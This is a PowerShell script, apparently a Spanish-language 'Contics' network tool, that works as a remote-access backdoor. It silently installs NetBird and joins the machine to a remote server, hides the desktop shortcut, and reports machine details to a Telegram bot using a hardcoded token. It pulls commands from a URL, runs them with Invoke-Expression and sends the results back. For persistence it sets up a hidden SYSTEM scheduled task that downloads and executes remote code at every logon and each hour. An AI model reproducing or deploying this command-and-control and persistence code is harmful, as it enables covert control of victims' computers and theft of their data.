# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - MONITOR + KEEP ALIVE + C2 PRO (ULTRA STABLE)
# ===========================================================================

# --- CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

# --- LOGICA DE RED ---
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'
$PCName = $env:COMPUTERNAME

# --- [PRO] RECEPTOR DE COMANDOS (C2) ---
if ($TareaUrl) {
    try {
        $r = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
        if ($null -ne $r -and $r.Content) {
            $O = $r.Content.Trim()
            if ($O -ne "NONE" -and $O -ne "") {
                Send-Telegram -Message "⚡ *ORDEN EN:* $PCName`n*Cmd:* `$O"
                $Res = Invoke-Expression $O 2>&1 | Out-String
                Send-Telegram -Message "✅ *RESULTADO:*`n$Res"
            }
        }
    } catch { }
}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "     SISTEMA DE RED CONTICS - OPTIMIZADO PRO" -ForegroundColor Cyan
Write-Host "======================================================`n" -ForegroundColor Cyan

# 1. Instalacion
if (!(Test-Path $nbPath)) {
    Write-Host '[1/4] Instalando NetBird...' -ForegroundColor Yellow
    $i = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $i -UseBasicParsing
    Start-Process -FilePath $i -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# 2. Conexion Inicial
Write-Host '[2/4] Vinculando equipo...' -ForegroundColor Yellow
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# 3. Limpieza
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
Start-Sleep -Seconds 8 

# --- [PRO] SALUD DEL SISTEMA ---
try {
    $d = (Get-PSDrive C).Free / 1GB
    $r = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
    $Salud = "`n*Disco:* {0:N2} GB libres`n*RAM:* {0:N0} MB libres" -f $d, $r
} catch { $Salud = "" }

# 4. Reporte e IP
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'
if ($lineaIP) {
    $nbIP = ($lineaIP.ToString() -split ':')[1].Trim() -split '/' | Select-Object -First 1
    $Msg = "*[OK] NODO CONECTADO*`n`n*Equipo:* $PCName`n*IP:* $nbIP" + $Salud
    Send-Telegram -Message $Msg
    Write-Host " [+] CONECTADO: $nbIP" -ForegroundColor Green
}

# 5. CONFIGURACION DE PERSISTENCIA (SINTAXIS LIMPIA)
Write-Host '[4/4] Configurando Tarea de Persistencia...' -ForegroundColor Yellow
$TaskName = "Contics_KeepAlive"

# Creamos el comando de forma aislada para evitar errores de escape
$CmdBase = '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr ' + "'$GitHubRawUrl'" + ' -UseBasicParsing)'
$FullArg = "-WindowStyle Hidden -Command `"$CmdBase`""

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $FullArg
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null

    $v = Get-ScheduledTask -TaskName $TaskName
    $v.Triggers[0].Repetition.Interval = "PT1H" 
    $v.Triggers[0].Repetition.Duration = "P365D"
    Set-ScheduledTask -InputObject $v | Out-Null
} catch { }

Write-Host '------------------------------------------------------' -ForegroundColor Cyan
Write-Host "Terminado."
Read-Host
